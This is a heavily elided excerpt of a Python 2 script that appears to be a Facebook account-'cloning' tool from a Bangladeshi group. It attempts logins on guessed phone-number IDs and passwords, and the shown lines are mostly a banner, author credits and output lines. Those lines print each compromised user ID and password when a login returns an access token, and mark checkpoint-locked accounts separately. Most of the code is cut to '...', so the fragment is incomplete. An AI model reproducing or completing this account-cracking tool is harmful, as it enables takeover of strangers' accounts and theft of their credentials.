...
psb('\x1b[1;32mBANGLADESH SELIM 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'GROUP    : KILLER BOSS TEAM '

    print 'FACEBOOK : SELIM.KHON.440'

    print 'GITHUB     : github.com/SELIM440'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[SELIM-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[SELIM-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
